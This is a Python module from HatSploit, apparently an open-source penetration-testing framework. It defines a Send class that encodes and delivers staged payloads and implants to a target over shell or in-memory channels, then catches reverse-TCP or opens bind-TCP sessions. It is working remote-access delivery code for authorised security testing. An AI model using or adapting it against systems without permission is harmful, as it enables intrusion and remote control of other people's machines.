"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import time

from typing import Optional, Tuple, Union

from hatsploit.lib.option import *

from pex.platform.types import Platform
from pex.post import Post, PostTools

from hatsploit.lib.session import Session
from hatsploit.lib.payload import Payload
from hatsploit.lib.encoder import Encoder
from hatsploit.lib.payloads import Payloads
from hatsploit.lib.handle import Handle

from badges import Badges

from pawn import Pawn


class Send(object):
    """ Subclass of hatsploit.lib.handler module.

    This subclass of hatsploit.lib.handler module is intended for
    providing tools for sending payloads.
    """

    def __init__(self) -> None:
        super().__init__()

        self.handle = Handle()

        self.payloads = Payloads()

        self.post = Post()
        self.post_tools = PostTools()

        self.badges = Badges()

        self.pawn = Pawn()

        self.types = [
            'one_side',
            'reverse_tcp',
            'bind_tcp'
        ]

    def handle_session(self, host: str, port: int, type: str = 'one_side', timeout: Optional[int] = None,
                       session: Optional[Session] = None) -> Tuple[Union[Session, socket.socket], str]:
        """ Handle session.

        :param str host: host
        :param int port: port
        :param str type: type of payload
        :param Optional[int] timeout: timeout
        :param Optional[Session] session: session
        :return Tuple[Union[Session, socket.socket], str]: session and host
        :raises RuntimeWarning: with trailing warning message
        :raises RuntimeError: with trailing error message
        """

        if type not in self.types:
            raise RuntimeError(f"Invalid payload type: {type}!")

        if type == 'reverse_tcp':
            if not host or not port:
                raise RuntimeError("Reverse TCP requires host and port set!")

            client, host = self.handle.listen_session(host, port, session, timeout)

            if not client and not host:
                raise RuntimeError("Reverse TCP received corrupted session!")

            return client, host

        elif type == 'bind_tcp':
            if not host or not port:
                raise RuntimeError("Bind TCP requires host and port set!")

            client = self.handle.connect_session(host, port, session, timeout)

            if not client:
                raise RuntimeError("Bind TCP received corrupted session!")

            return client, host

        else:
            raise RuntimeWarning("Payload sent, but not session was opened.")

    def send_implant(self, payload: Payload, client: socket.socket,
                     encoder: Optional[Encoder] = None) -> None:
        """ Send implant available in the payload with available phases.

        :param Payload payload: payload
        :param socket.socket client: primary socket pipe
        :param Optional[Encoder] encoder: encoder to encode with
        :return None: None
        """

        if not payload:
            raise RuntimeError("Payload was not found!")

        step = 1
        while True:
            if not hasattr(payload, f'phase{step}'):
                break

            phase = self.payloads.run_payload(
                payload=payload,
                encoder=encoder,
                method=f'phase{step}'
            )

            if not phase:
                raise RuntimeError(f"Payload phase #{str(step)} generated incorrectly!")

            self.badges.print_process(f"Sending payload phase #{str(step)} ({str(len(phase))} bytes)...")
            client.send(phase)

            time.sleep(.5)
            step += 1

        if hasattr(payload, 'implant'):
            implant = self.payloads.run_payload(
                payload=payload,
                encoder=encoder,
                method='implant'
            )

            if not implant:
                raise RuntimeError("Payload implant generated incorrectly!")

            if implant:
                time.sleep(.5)

                self.badges.print_process(f"Sending payload ({str(len(implant))} bytes)...")
                client.send(implant)

    def shell_payload(self, payload: Payload, host: str, port: int,
                      space: int = 2048, encoder: Optional[Encoder] = None,
                      *args, **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload if the destination is shell.

        :param Payload payload: payload
        :param str host: host to start listener on
        :param int port: port to start listener on
        :param int space: maximum payload size
        :param Optional[Encoder] encoder: encoder to apply
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)
        arguments = payload.details.get('Arguments', '')

        if not payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if not host and not port:
            raise RuntimeError("Host and port were not found for payload!")

        platform = payload.details['Platform']
        arch = payload.details['Arch']
        type = payload.details['Type']

        main = self.payloads.run_payload(
            payload=payload,
            encoder=encoder
        )

        if len(main) >= space and hasattr(payload, 'phase'):
            phase = self.payloads.run_payload(
                payload=payload,
                encoder=encoder,
                method='phase'
            )

            if phase:
                phase = self.payloads.pack_payload(
                    payload=phase,
                    platform=platform,
                    arch=arch
                )

                self.badges.print_process(f"Sending payload phase ({str(len(phase))} bytes)...")
                self.post.post(
                    payload=phase,
                    platform=platform,
                    arch=arch,
                    *args, **kwargs
                )

                if type not in ['reverse_tcp', 'bind_tcp']:
                    type = 'reverse_tcp'

                client, host = self.handle_session(
                    host=host, port=port, type=type)

                self.send_implant(payload, client, encoder)
                return client, host

        phase = self.payloads.pack_payload(
            payload=main,
            platform=platform,
            arch=arch
        )

        self.badges.print_process(f"Sending payload ({str(len(phase))} bytes)...")
        self.post.post(
            payload=phase,
            platform=platform,
            arch=arch,
            arguments=arguments,
            *args, **kwargs
        )

        return self.handle_session(
            host=host, port=port, type=type)

    def memory_payload(self, payload: Payload, host: str, port: int,
                       space: int = 2048, encoder: Optional[Encoder] = None,
                       *args, **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload if the destination is memory.

        :param Payload payload: payload
        :param str host: host to start listener on
        :param int port: port to start listener on
        :param int space: maximum payload size
        :param Optional[Encoder] encoder: encoder to apply
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)

        if not payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if not host and not port:
            raise RuntimeError("Host and port were not found for payload!")

        type = payload.details['Type']

        main = self.payloads.run_payload(
            payload=payload,
            encoder=encoder
        )

        if len(main) >= space and hasattr(payload, 'phase'):
            phase = self.payloads.run_payload(
                payload=payload,
                encoder=encoder,
                method='phase'
            )

            if phase:
                self.badges.print_process(f"Sending payload phase ({str(len(phase))} bytes)...")
                self.post_tools.post_payload(
                    payload=phase,
                    *args, **kwargs
                )

                if type not in ['reverse_tcp', 'bind_tcp']:
                    type = 'reverse_tcp'

                client, host = self.handle_session(
                    host=host, port=port, type=type)

                self.send_implant(payload, client, encoder)
                return client, host

        self.badges.print_process(f"Sending payload ({str(len(main))} bytes)...")
        self.post_tools.post_payload(
            payload=main,
            *args, **kwargs
        )

        return self.handle_session(
            host=host, port=port, type=type)
